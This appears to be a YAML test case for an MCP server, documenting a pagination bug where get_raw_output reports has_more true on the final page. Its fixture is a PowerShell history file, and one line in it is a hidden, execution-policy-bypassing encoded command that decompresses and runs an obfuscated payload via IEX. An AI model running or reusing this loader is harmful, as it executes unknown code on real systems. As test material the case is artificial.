@@ -1,0 +1,219 @@
+# Matrix case P4135-007: get_raw_output sets has_more = len(page) == limit
+# (core.py 908), so a page that happens to hold exactly the last `limit`
+# windows still says there is more. Here a PSReadLine history indexed as six
+# windows is read two windows at a time: the third page returns windows 5
+# and 6, the last two, with has_more true, and the cursor it gives returns
+# nothing.
+case_id: P4135-007
+problem: P4135
+server: mulder
+variant: mulder-3164843
+commit: 3164843baf74c7fe69e7121dbd6150f8f77ce660
+display: multi-call
+level: mcp
+realism: possible
+realism_ko: "긴 source를 `limit`을 정해 쪽 단위로 읽는 것은 도구 설명이 권하는 방법이고, 남은 window 수가 `limit`의 배수이면 마지막 쪽에서 늘 이렇게 된다."
+coverage: full
+summary: >-
+  Reading a six-window source two windows at a time, the third
+  get_raw_output page returns windows 5 and 6 (next_after_id 6 of
+  total_windows 6) with has_more true; following its cursor returns zero
+  windows.
+summary_ko: "window 6개인 source를 2개씩 읽으면 세 번째 `get_raw_output` 쪽은 마지막 window 5·6을 돌려주면서(`next_after_id` 6, `total_windows` 6) `has_more: true`라 한다. 그 커서로 다시 부르면 window 0개가 온다."
+defect_ko: "이 서버는 받은 window 수가 `limit`과 같기만 하면 남은 출력이 있다고 표시한다. 정상이라면 마지막 window까지 받았을 때 `has_more`는 거짓이어야 한다. 모델은 아직 읽지 않은 출력이 있다고 보고 빈 쪽을 더 부르거나, 다 읽지 못했다고 보고한다."
+setup_ko: "관리 명령과 인코딩된 PowerShell 명령이 든 사용자 `ConsoleHost_history.txt`를 `run_strings`로 적재하면 window 6개가 된다. 이것을 `limit: 2`로 차례로 읽었다."
+fixture:
+  - path: C/Users/jlee/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt
+    text: |
+      Start-Process msiexec.exe -ArgumentList '/i C:\Temp\setup.msi /qn' -Wait
+      Invoke-Command -ComputerName ws0142 -ScriptBlock { gpupdate /force }
+      Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
+      Get-EventLog -LogName System -Newest 50 | Format-Table -AutoSize
+      Test-NetConnection -ComputerName fs01.corp.example -Port 445
+      Get-ADUser -Filter {Enabled -eq $true} -Properties LastLogonDate | Sort-Object LastLogonDate
+      Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10
+      Get-EventLog -LogName System -Newest 50 | Format-Table -AutoSize
+      Get-Process | Sort-Object CPU -Descending | Select-Object -First 15
+      Get-EventLog -LogName System -Newest 50 | Format-Table -AutoSize
+      Test-NetConnection -ComputerName fs01.corp.example -Port 445
+      Get-ScheduledTask | Where-Object State -eq 'Ready' | Select-Object TaskName, TaskPath
+      Get-ScheduledTask | Where-Object State -eq 'Ready' | Select-Object TaskName, TaskPath
+      Test-NetConnection -ComputerName fs01.corp.example -Port 445
+      Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, FreeSpace, Size
+      Test-NetConnection -ComputerName fs01.corp.example -Port 445
+      Get-ScheduledTask | Where-Object State -eq 'Ready' | Select-Object TaskName, TaskPath
+      Get-EventLog -LogName System -Newest 50 | Format-Table -AutoSize
+      Get-ADUser -Filter {Enabled -eq $true} -Properties LastLogonDate | Sort-Object LastLogonDate
+      Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, FreeSpace, Size
+      Get-EventLog -LogName System -Newest 50 | Format-Table -AutoSize
+      Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
+      Get-EventLog -LogName System -Newest 50 | Format-Table -AutoSize
+      Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, FreeSpace, Size
+      Get-EventLog -LogName System -Newest 50 | Format-Table -AutoSize
+      Invoke-Command -ComputerName ws0142 -ScriptBlock { gpupdate /force }
+      Copy-Item \\fs01\deploy\agent\setup.msi C:\Temp\ -Force
+      Get-ScheduledTask | Where-Object State -eq 'Ready' | Select-Object TaskName, TaskPath
+      Invoke-Command -ComputerName ws0142 -ScriptBlock { gpupdate /force }
+      Get-ADUser -Filter {Enabled -eq $true} -Properties LastLogonDate | Sort-Object LastLogonDate
+      Copy-Item \\fs01\deploy\agent\setup.msi C:\Temp\ -Force
+      Get-ChildItem -Path C:\Users\jlee\Downloads -Recurse | Select-Object FullName, Length
+      Get-ADUser -Filter {Enabled -eq $true} -Properties LastLogonDate | Sort-Object LastLogonDate
+      Get-Process | Sort-Object CPU -Descending | Select-Object -First 15
+      Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10
+      Get-ADUser -Filter {Enabled -eq $true} -Properties LastLogonDate | Sort-Object LastLogonDate
+      Test-NetConnection -ComputerName fs01.corp.example -Port 445
+      Get-EventLog -LogName System -Newest 50 | Format-Table -AutoSize
+      Get-Process | Sort-Object CPU -Descending | Select-Object -First 15
+      Resolve-DnsName update.corp.example -Type A
+      Get-ScheduledTask | Where-Object State -eq 'Ready' | Select-Object TaskName, TaskPath
+      Start-Process msiexec.exe -ArgumentList '/i C:\Temp\setup.msi /qn' -Wait
+      Get-LocalGroupMember -Group Administrators
+      Get-LocalGroupMember -Group Administrators
+      Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10
+      Copy-Item \\fs01\deploy\agent\setup.msi C:\Temp\ -Force
+      Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, FreeSpace, Size
+      Get-ChildItem -Path C:\Users\jlee\Downloads -Recurse | Select-Object FullName, Length
+      Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, FreeSpace, Size
+      Test-NetConnection -ComputerName fs01.corp.example -Port 445
+      Copy-Item \\fs01\deploy\agent\setup.msi C:\Temp\ -Force
+      Resolve-DnsName update.corp.example -Type A
+      Start-Process msiexec.exe -ArgumentList '/i C:\Temp\setup.msi /qn' -Wait
+      Get-LocalGroupMember -Group Administrators
+      Copy-Item \\fs01\deploy\agent\setup.msi C:\Temp\ -Force
+      Test-NetConnection -ComputerName fs01.corp.example -Port 445
+      Get-ADUser -Filter {Enabled -eq $true} -Properties LastLogonDate | Sort-Object LastLogonDate
+      Get-ScheduledTask | Where-Object State -eq 'Ready' | Select-Object TaskName, TaskPath
+      Get-ChildItem -Path C:\Users\jlee\Downloads -Recurse | Select-Object FullName, Length
+      Start-Process msiexec.exe -ArgumentList '/i C:\Temp\setup.msi /qn' -Wait
+      Invoke-Command -ComputerName ws0142 -ScriptBlock { gpupdate /force }
+      Resolve-DnsName update.corp.example -Type A
+      Get-ScheduledTask | Where-Object State -eq 'Ready' | Select-Object TaskName, TaskPath
+      Get-EventLog -LogName System -Newest 50 | Format-Table -AutoSize
+      Test-NetConnection -ComputerName fs01.corp.example -Port 445
+      Start-Process msiexec.exe -ArgumentList '/i C:\Temp\setup.msi /qn' -Wait
+      Start-Process msiexec.exe -ArgumentList '/i C:\Temp\setup.msi /qn' -Wait
+      Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10
+      Resolve-DnsName update.corp.example -Type A
+      Get-LocalGroupMember -Group Administrators
+      Test-NetConnection -ComputerName fs01.corp.example -Port 445
+      Test-NetConnection -ComputerName fs01.corp.example -Port 445
+      Get-NetTCPConnection -State Established | Where-Object RemotePort -eq 443
+      Resolve-DnsName update.corp.example -Type A
+      Test-NetConnection -ComputerName fs01.corp.example -Port 445
+      Get-EventLog -LogName System -Newest 50 | Format-Table -AutoSize
+      Copy-Item \\fs01\deploy\agent\setup.msi C:\Temp\ -Force
+      Get-LocalGroupMember -Group Administrators
+      Copy-Item \\fs01\deploy\agent\setup.msi C:\Temp\ -Force
+      Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
+      Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10
+      Get-Service -Name Spooler | Restart-Service -Force
+      Get-LocalGroupMember -Group Administrators
+      Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10
+      Get-ChildItem -Path C:\Users\jlee\Downloads -Recurse | Select-Object FullName, Length
+      Get-ADUser -Filter {Enabled -eq $true} -Properties LastLogonDate | Sort-Object LastLogonDate
+      Resolve-DnsName update.corp.example -Type A
+      Get-EventLog -LogName System -Newest 50 | Format-Table -AutoSize
+      Get-Process | Sort-Object CPU -Descending | Select-Object -First 15
+      Copy-Item \\fs01\deploy\agent\setup.msi C:\Temp\ -Force
+      Invoke-Command -ComputerName ws0142 -ScriptBlock { gpupdate /force }
+      Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, FreeSpace, Size
+      Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
+      Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
+      Resolve-DnsName update.corp.example -Type A
+      Test-NetConnection -ComputerName fs01.corp.example -Port 445
+      Get-ChildItem -Path C:\Users\jlee\Downloads -Recurse | Select-Object FullName, Length
+      Get-LocalGroupMember -Group Administrators
+      Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
+      Get-NetTCPConnection -State Established | Where-Object RemotePort -eq 443
+      Invoke-Command -ComputerName ws0142 -ScriptBlock { gpupdate /force }
+      Get-ScheduledTask | Where-Object State -eq 'Ready' | Select-Object TaskName, TaskPath
+      Get-NetTCPConnection -State Established | Where-Object RemotePort -eq 443
+      Get-ScheduledTask | Where-Object State -eq 'Ready' | Select-Object TaskName, TaskPath
+      Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10
+      Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
+      Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, FreeSpace, Size
+      Invoke-Command -ComputerName ws0142 -ScriptBlock { gpupdate /force }
+      Test-NetConnection -ComputerName fs01.corp.example -Port 445
+      Get-ChildItem -Path C:\Users\jlee\Downloads -Recurse | Select-Object FullName, Length
+      Invoke-Command -ComputerName ws0142 -ScriptBlock { gpupdate /force }
+      Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, FreeSpace, Size
+      Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, FreeSpace, Size
+      Get-Service -Name Spooler | Restart-Service -Force
+      Resolve-DnsName update.corp.example -Type A
+      Get-ChildItem -Path C:\Users\jlee\Downloads -Recurse | Select-Object FullName, Length
+      Get-NetTCPConnection -State Established | Where-Object RemotePort -eq 443
+      Copy-Item \\fs01\deploy\agent\setup.msi C:\Temp\ -Force
+      Get-Service -Name Spooler | Restart-Service -Force
+      Invoke-Command -ComputerName ws0142 -ScriptBlock { gpupdate /force }
+      powershell.exe -NoP -W Hidden -Exec Bypass -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEMALwAwADEAWAAxADQANwBrADIATABGADgAMQAxAGYAMABRADkAOAA3ADMAZQBCAHUAcwAwAGcAVwBuAFEAWQBqAGcASgA0AHMAZQBsAGMAMABnADgAVQBGAHYAUwBtADYAbwBpAGMAbAAvAGYAdQB0AGsAVgBhAEEAbgB2AE0AZwBNAHYASQBnAEUAUgBsAGgAWgAvAFAAdgA5AGoAeABXAHkAYQB6ADIAYQBmAGIAMgArAHoAMABiAHAANgByAHYAMwB1AEMALwAvAEsAUwBQAE8AZgB2ADUAeAB4AC8AdgBhAHoAVAArAFgALwBLAHIAKwBPAFAAdABwADMAMQBNAGMAOQBaACsATQBYADIAMwBaAHUAUAA4AHgAMQAvAC8AeQBvADkAOQBTADAAZABUAGgAbAAxAC8AbwBYAFQARgB4ADcAZQBOAE8AKwBnAHAASABnACsAagBYAGwARgA4ADkAWgBIAHUAbQBHACsAYQBEAEkAagBrAFgAVgBLAGkAdQBGAEgAWQBzAEYAagBLAGUATAA3AFAAbgBkAHcAbgByAFkAYQBkAHYAdABXAEMAUwBxAEMAegBQAGIAaQBYAGcAcgA2AGgAaQBvAHoASgBQAG4AVgBKAEQAZgBvAHgAQwBqAFYAQwBHAGQANABtAG4ANABnAFEAcgBsAGEATQBQAFAAdgBwAFcAQgBCAE4AaABuAGoAZgBOAEYARQBOAGYANAB6AEgAZABDAEYAWgBwAGsAZwB1AEYAbwBuAFcATQBZAFYAUgA4AGUAMgBPAEQANwAzAGoAbQBUAHMAQQBZAFgAUABLAE8ARwBaAFgAKwB1AFoATgA5AGIAagA2AE0AQwB5AGcASgBjADgAZwB6AFcARgBCADQAeAAyAGwAWQB5AHUAMgBHAHQAcABJAFEAMABFAEwASwBJAFcAOABzAFcAWQBYAE8ASABTADUAdgBQAGwAcgBmAFAATwBPADIASABnAEEAdQBCADMAdwBBAG8ANQBRADIAdwBFADIAVAB0AEkAbwB5AGYAbABFAC8ARgBDAEoAYQBnAFcAZgBiAG0ATQAyAGwAawB4AGkARAA4ADEAQgBvAGEAbgBqAGoAdQBWADEAYwBuADEAcABZAEcARABKAE0AUgB3AEQANwBwAFQAZwBtAHYAcgBwAG8ANgBuAE0AWQBpADcAdABZAFoAZgA2AEIATQBBAG8AYgA0AGEAQwBoAHUARwA3AC8AdQByADIAUQBlAGcATABXAGQANABKAHIAWQB2AHkAaQB6AHkAWgBMAGMAVQBWAHkAUwAzAEkATgBSAEoAbAA0AHgAUgBNADIAagBUAHUAdgBEAFYAMABjADIATwB5AFoAbwBZACsAYgBBAGIAaAAxAFUAUQBtAGQARABPAC8AQgBUADQARwBvAFcAYQBWAG0AWABRADUAUAB2AHYAQgB2ADEAaABkAEMAOABDACsAeQBZAHoAYgBNAFoANQAxAEcANABKAFUAaABZAG0ASwAyADYAbAA4ADgAbABEAGEAYwBFAGIAawBDAHkAZwBPAEsANgBRACsAMwBOADYARABMADQAbQBVADIAcABQAEIAdQAvAFoAVgBTADkAaABPAE0AQgBzAFMANgBCAE0AYQBzADkAVgBWAHkAbQBYADYAMQBxAGYAWAB5AEkAOQBIAFUARgBVADcATQBsAFQAOQAwAEUANgBWAFoAeQBEAEgARgBoAFgARABJAGwAagBkADEAQgBiAEUAbQBwAHMAeQA0ADgAdQBWAEMAQQBkAGkASgBJAHIASwB4AGEAcQA4AHIAWgBKAHcAagBJADUAZwBzAGEAWABvAGEAbAA0AEoAZABPAGwAaQBBAEYAQQBmAHEAbQB1AEsATwBEAG8AQgBrAGEAMQA1ADIAeQBaAHoANQBOAE4AawAyAGoARwBaAHkASgBDAEsAMwBDAEsAKwBsAGsAZQBTAGQASQB1ADIAcQBJAEoARQBYAEkAVABoAHAAdQBiAFgATwB1ADgAOQBBAFkAUQAzAFgASQAyAFkAUgAzAGgAWgBRAHUARwB4AEYAcQBGADUAegAzAGQASQBCAHMAeABXAGsAdgBrAFQAZQBVAFkAawA4AFMARAB2AGQANgBtAE4AVgBuAFIARABzAGIARwBGAEgAMgBtAFYATQAyAGcANABIAGwAaQBkAGoAUQBjAFgAYgBxAE8AegBhADkAcQA0AFMAYwA5AFoAQgBBAEYAOQA0AGUAaABGAHUAUQA3AGcAcgBwADQAUABKAEMAUQBVADAAMgBKAEQAWQB1ADIAcABXAC8ASgBhAFcASgA5AEEAawBnAGUAcABhAFUAQQAvADgAaABSAE4AcABiAHMAZQBtAHcARwBiADYANAA3ADAAYQBEADEARgBLAEgAMgBKAG8AcwBOAHgAcgBKADgAOABRAFMAQQBsAHcATQA1AHkASwBsAEoAegBEAFoATABKAFUAQwBCAE8AdQBQAG8ATwB3AFUAVwBJAHYAeQBSAEQAUQA2AEYAdQBGAGUAVgBRADIAOABFAGEAagBIAGUAQwAyAEoAdwA1ADYAUwBQAEsARgBiAEoAMgArAGIARABtAG0AZQBWAHEAVgB5AGoAUgA3AE0AaQBpAFEAcgBkAEwAOQB5AG4AdwBHAGIANAB6ACsAUgBZAEQAdwA3AFUASgBFAE0AcQB1AEQARABrADIAZgBBAE0AZQBtAFgAbgBBAFUANABYAHUAagBsAEQAQgBIADgASABUAHcANABnAEMAdABQAE8ASgBjAEQAZABhAG4AQwBVAGEAWQBJAE8ARABtAFoAZABnAEcAZgBrACsAcQB1AHEAdwBvAEMAVgB6AFIANwBUAFYAVwBQAGEAQQBUAFUARABPAEEASAB6AFQAagBoADIALwA2AG4AcABnAFEAVwBYAEIAbAAxAHcAZgBOAHkAVgBMAGgASQBkAEcAaQBUAFQAYgBGAG0AVwA0ADMAeQBFAFEAZgBIAGgAaQB5AGsASABaAGYARABXAEcAeQBLAHUAdgBMAFYARAAwADkAKwBZAHEAbwBuAG4AdQBsAC8AcABEAFkARABvAHAAZQBWAEsANQBIADUAeQA0AEoAVgAyAG8AVgBZAFAAUgBtAEgAQwBiAEwAaQBFAEYAagA2ADkAdgBJAHgAcQBqAGcAYwB0AHEAbwA3AFoAeQArAEwASABZAGQATgBnAFgAcABkAGIAVABVAFcANgB0AEQAWgBiAGYANABNAEkARQA4ADYAUwA0AHMASQBiAHMASABLAGgAegBYAEUAZgByAEUAUwBKADMAWQBRAEIAZwBTAEgATgB2AFMAKwB0AEkASgAxAHkAdwBTAE0ATQBHAGUAbwBVAGIAeQB6AEkANwBaAHAARgBFAHQAagByAE4ANgB6ADIAVgBwADQARwAzADcANABlAEUANwBNAGIAYwB0AEEALwBLAEkAegBFAHUAMwBxAHYAZABUAGgATAB5AFEAVABUAFEAeQBpAGUANwB1AFMAcwBKADYASQBoAG8AeABWAHQANgBZADYAagA1ADAARwBsAFoAbQBwAE8AZAB1AE8AcABPADQAVwAwAFQALwBSAHIALwBpAHUAcABEAFQARQB3AGIATABEADAARQBCAEYARwBtADUAVgBxAGEAcgBsAGsAOQBDADUAbABlAGEAYwB1ADgAbABMAHEAZwBzAFEAQwBxAHUAWQBrAHQAbgBNAFYAZABhAEcAcQA5AHUAUgBYAHIALwBWAGwAMgBiAGIAMgBXAHQAOABaAFAAVQBMAHQAKwA1AHQAUwA5AFQAegBCAEIAcQBUAHMAdABFAEcAOQByAG4AMQBNAHIAOQA3AHcAKwA3AGEANQBLADcAMwAzAFEAWABJAFcAcwBwAHkAZwByAGMAUQA4AFgAUwBUADEATQA0AEEAdwBzAHAAUgBOAEYAMgBBAFMAbwBQAFMATQA0AG0AZgBYAEkARQBpAHEAYwBnAEgAaQBPAFIAbgBZAFYAcgBiAG4AQwA3AGsAZQB0ADMATgB4AGsAQQBnAHcAaQBoADAAeQBLAEwAdwBuADEAaABFAGoAVQB0AFMANABRADMAYgA0ACsASABJADUAZABMADcAdwBXAHIAVgBWAGYASwBJAEwATgA4AGEAcgByAFAARgArAEYAUwBqADkAdwBEAEcAdwBSAGgATAA3AE8AUwB6AFIAZAA1AFMAMwAxAFMAcgAvAHMAMwBDAGkAdABkAHEAegBFAHQAcABYAGQAcQBRADMASgBVAHgAUwBhAEQAaQBiADEANwBaAEwAUwBkAEMAZQAwAEoANgA3AFEAMgBmADAAdQA4AEwAYgBrAFMALwBIAFEAUwBvAGsASgA1ADIAMwBUADYAeABaAG4ASwBUAGYAagBvAGwANwBVAEkANwBwAEYAOQBhAGgAVgBQAEQAUABxADcASQBPAHUAaQBNAEgAUQBIAFoAWgBVAEQAZQBTAFUAZAA0AEkAdQBGADIAWABRAGYARwBTAGoAdQA4AGMAKwBNAGQATQA2AGIAUQBDAEUAawAxAE4AdwB0AHgANABlAEIASQBPAFEAZQBaAFgAegBDAFIAcgB3AFkARAB1AFQAZgBvAEsAcABBADQAagBDAFIAWQBDAGgAbgBFAG0AQgBtAGUASgBpAHUAWABPAEEAcQBMAGsAdgBTAEYARQBnAEkAZgBVAEUAZABqAFQAbwBxADgAaQA1AGsATQBDAEEAMwArAHgATQBUAG8AdQBTAHQAVgB4AE4AYwBEAGoASABYAGEATABYAHEAVgBCAEQATgBvAEYAcgB1AEIATgB3AGkAeABOAE8AagBkAHcAYgA0AEsATABZAGsAbQBGAFEAMwBaAGwAQQB5AEIAMwB5AFcAYgBCAEgASQBvAFoAWAA1ADUAQQA0AGUAWQBhAEMAagBYAHgAZwBaAGoANABkAE4AbAA4AEUANgBzAEEAcABCAE4ASQBPAFIAKwBuAEUAdgBQAHAAawBGAEgAaQA5AEwATQAzAG8AVAB3AFUAdwBsAHcAZABkAHEANABZAHEAYgBrAEUATAB6AGQAbQBsAFAATgBPAGoASgBhAEQAdAAwAFAAZgBwAHoAawBsADEAcwBOAEsAbgBQAFQAbwBPAGoAbwBZAFUAbwBkAHkAaABTAG0AVgBvAHUAQQBGAGgASwBnAEMAUQBQAEgAdwArAHkATAB5AE8AWgBiAHoAUgBXADgASgBOAFoAUwB3AFUASgB5AHIAaABvADgAUAAyAEMAbABhADcAcABSAEQAWQBUAFMANwA2AFAAQgB0ADMAYQBRAFcAZgBqAE8AMgA2ADAATQA5AEQAaABMAHAAVQBKAE4AWQB0AEoAUQBIAHkAQgBpAEEANABlAEsAYwAwAGUAOQBCAEIAbwBBAEUAdwBFAEoANgBEADEAbABjAEsAbgBTAG0AegBRAFQAWAB5AHEAMgAzAHgATQA4AFEAeABzADYAbwBzAEMAOQBFAHUARgB2AEkARQBnADQASgArAHUAawAzAHMARQArAGYAegBxAFUAeABDAFQAUgBoAHkAVQAvAFYARABRAHkAdQAwAG8ANQA1ADcAcAA3AFoATwB3AHYASwB3AGUASQBvAFQAcgBjAGoAdAA1AG0ATABOADQALwBSAHAAeABWAGUAMwBpAEwAQgBRAGoARwBzAGIAMwBPAGMAaQBWAFUAYgBvAEYAZQBEAFoAMAB6ADgAQgBzADYASwBKADAAQwBCAEkAOQBTAEsAdgAvAE8AUwBZAGUAVQBRAFYASgBxAEIANABCAEcAQwB1ADMASwAzADIAegA5AGIAZgBXADkAeQB1AEYAZwA4AEUARgBrAFkAbwBLAFYANwBjAGsAbgA1AEgAZwBmAHgAdQBQAEwASQArAFAAZwB1AEMAdgA4AHMANgAzAGoAaABRADcAdgBEAG8AZABYAGsAMgBBAFoARQAvAGkAMQBUAHIANQBoAG4AWQAxAEoAaABLAGcAYwB5AGkAWgBGAHUAbwAwAHQATABrAFEAMAAyAHkAcgB5AGMANAAyAGUAdAAxAGcAMABPAGsASwB4AEUAWgBiADEAdQBHAFYAdgAxAFIAVQBkAHcAaQBKAFIAWgB1AE0ASwB3AHUARQBQAFoASwBnAFEANQAzAGkAVgA4AHkATABGADQAOQBVAEMASABnAGQAYgBrAE0ARABzAFkAWgBrADAAVABJAEsAcwAzADMAZwBBAEQAegBOAGYAbQBpAHcAdQBrAE0AaAAwAEcAdAByADMASgBQAHQAdQB5AHQAbAAwAGwAQgBKAFgAVQBpAGwAVgA2AHYAMAB3AE8ANQArAGQAbgBkAFcAdgAxAHkAOQAyAGkAZABuAGUAbQByAEwAawBnAE8ASQByAEsAYQAzAEIAZQAzAHAAdABVADUAaQBJAGcAOABvAEMAQQBTAGMAQQBWAGoANQByADcAdwBtAEcAMwBHAGEANwBEAGYAegBJAFQASgBYAGcANwBCADMASABkAHoAYQBsAEUATQBiAGwATABRAHgASgBkAEwATwB5AFEAVwBsAEsAQwBYAHMAWABDAGsAMgByAHQAMABxAE0ARQBHAFQALwA4AEoAZQBUAHgAdwBaAGgAVwBXAEoANQBoAFQAUQBoAE4ANQBrADgAZwBDAHoAagBBAGsAdQBHAE8AWgBJADQAcQBOAFoAagBsAGkARwBOADQAWQBYAFYANABzAFEASwBJAGUARABYAEIARgBTAHMAZQBLAHIAMQBCAGkATgBUAHYAawBlAFcAYQB2AEcATABEAHEAZQBZADAAUQBEAEYAQgBIADIANgBJAHAASwBzAEwANABNAEwAYQBGAEoAcwBXAEwASgBaAFcAZwBqADAAKwAyAGkAMQA5AGYAbwBtADgAKwBqAEQAZwBrAEIAMQBYAE4ARwB5AGMAbgBVAGUAcQAxAEoAZAAwADIASgB3ADEAMAAxADIANABBAHgAVwA2AFAAUABiAGkANgBOADkAdwBmAGEAMAAxAFIATgAyAC8AUABGAEEAUABBAGkAZgBvAHMAQQBHAE0AaQBoAFYAUwAwAEYARgB5AGQAWABTAGIASgBmAFcANwBxAG8AeQBWAEMAdABBAHgAYgA4ADAARwA5AHgATQBOAGoAdQBlAFIAawB3AFMAOQAxAG0AawB0AFkAbgBJAGIARgBjAEYAcABrAHIAbQBCADAANABuAEoAQgBwAFgAQwAxAFQAaABsAEYAbgBHAFcAVwA3AGUAagBoAHMAZAArAGQAUwAxAGIAWgA2ADIASQBEAEgARwBpAGkAcwBmAG0ANAA3AHMAUgBMAFIALwBvAGsAdQBYAGMATABzAE0AUwBrAHcAVwBRAHMAYwBqAHcAVABqACsAVwBPAEkAcgBxADQAeQBMAE0AWgAxAGsAVgArAGUASgBnAHYAbQByAE0AbABqAFUAbwBwAEUAbgBFADUATwArAG4AcABrAE4ANAAwAGMAMgBsAFgATwArAHgAWgB1AGEASwBqAFUAWQBwAHQARwBMAGoAaQBhAEoANgBoAHEAMABxAEgARABmAHEAbABpAFIAMQBwAGwAMAAwAFcASgBKAFMANgB2AFcATwB4AFAAWQBOADAAVwBzAEgARAA0AEIAOAB2AFIAOQBmAHoAcgBGAFcAeAA0AE4ARABtAEMASABtAEsAZQBKAHkANABFADUARAB3AFUAdQBjAGUAbAB4AGoAVQBuAEoAYgAxAGcAUQBRAHAAeAA0AFAAMABsADAAagBHAGIAdwBNAFoANgByAGQAbwBoAFMARABHAGoAVgByAFcAOABhADAAcgBQAE4ATwArAFQAWgB0AEMAUwBnADIAcgBvAGgAYQBKAEUAZgBJAGQAVQBIAEYATgBjADYAbABSADIAWAAyAGQASwBQAFUASQBmAFEAQQBBAEUAMwBHAEwARwB0AHQAdgBvAGYAbwBlAG0AQgBVAHIARgBWAE8AcgB0AEwAdgBaAHgANABuAGEAZQAxAGQAcgB4AG4ASgBFADgAdAB4ADcAVgBWAEoAQQBHADAATwA5AFMARQByAGQASwBTAGEAcABuAHAAMQBHAG8AZQBUAE0ASAB0AHoAeABuAFAARQAzADMAVAAzAEcAQgAvAFkAawB2AFAARwBzAE8AQgBCAFcAWAB1AEwAVwBpAHUAcwBqAHAAbABGAGsARgAzAFIAVwBSAG8AMwBzAEkAcQAyAGgATgBOAEQAWABoAGMAVABjACsARABYAEcAQgBGAEwAUgBVAEoAKwBSADYASABUAG0AMQBTADkAWABFAGQAZABqAGoAZwBLAFUAbAAzAFYAaABIADgAKwBjAEoAcABMAEoANgA2AEwASAB5AHcASgBVAFMAMQBoAFcAVQBrAGoATQBDAGEAcABSADUANAAyAEIAegB3AFYAaQA2ADMAdAB2AEwATABqAGgAcwBQAG8ATwBuAHIARgA1ACsATwBIAEwAdgBuAFcAVQBlACsANgBXAGoAUQBoAGUANwBCAEMAUwAyADAASAB6AEIAZQB5AFYAYgBDAG8AbwA5AEYARwA2AFEAZQA0AFUAVABnADgAdgBtADYATAA1AHQAeQBRAGcAbABtAG4AdQBxAG4ARgBKADQAaQBpAGQAYQBhAEMAbABmAG4AegA3AC8ATQB0ADcAOABrAFAATAB0AHQALwAxAHUATQA2AFMAKwBVADMATAA1AGkAKwA3AFQAeAA3AFoAUABIADAANQBqAE0ARQAwAFYAZABiAE4ASAA5AC8AZwBDAC8ASgAxACsAWQBJAGcANQBBAHYALwA5AHQAdgAxAGkAbgB4ACsAZgA1ADkAKwB2AEMAZABmAFEAagBhAC8AWQBrAFEAVwB0AFIAKwBmADMAMwAvAEcAZgArAGEAUAArAE0AZgBsADYAdwB0AEQAVQBRAFQAOQB4AC8ALwA4AC8AZgBMAFAANwAxAHQAWgBOAGQAbgBIAHgAMwB2ADEANAAzADMANgBzAHIASQBvAC8AWABpAFAAZgA3AHYAOAA5AGgANQAvAEsAVgBuADMAOAB0AG0AZgBuADIAKwAvAGQAOQBuAGIANQBmAFAAdgA3ACsAbQBQAGoALwA4AGkANAAyAFQANwAvAEUAWABaAGoAQwBSAHgAMwBTAHYAUQB2AE4ATABLADUANQA4AGQAZgB3AFcAWABmADQATgBVAEwAeQByAGoAagA0ADgAcQAyADkALwBlADAAegBmADQAYgAvADgATAAvAFUATgBmAC8AaAAyAFIAWABzACsALwB2ADgAOAAvAFAAbgA3AE8AdgAzAEMAeQBQAHkARgBlAEcAZQBoAGYAawBQACsAQwArAGgAVwBaAHAAbwAvADMARQBmAGgAbQAyAEcALwBmAGcASQA5AGgAUwB6ACsALwBqAEcAZwB1AGcAVwA5AC8AZQAvAHYAMgBhADgAbwB2AGIANgB6AG0ANwBPAE4AOQAvAHQAVgBzAC8AZwAvAGoAWAB3AFcAKwBXAGEAYgB5ADQALwBPAGYAMwAxAC8ALwB3AEQAVAA5AGwASAAxADgALwBqAC8AcABpAEsAdwBlAG4AUQAwAEEAQQBBAD0APQAiACkAKQA7AEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACQAcwAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7AA==
+      Get-ScheduledTask | Where-Object State -eq 'Ready' | Select-Object TaskName, TaskPath
+      Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10
+      Start-Process msiexec.exe -ArgumentList '/i C:\Temp\setup.msi /qn' -Wait
+      Invoke-Command -ComputerName ws0142 -ScriptBlock { gpupdate /force }
+      Get-EventLog -LogName System -Newest 50 | Format-Table -AutoSize
+      Get-LocalGroupMember -Group Administrators
+      Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
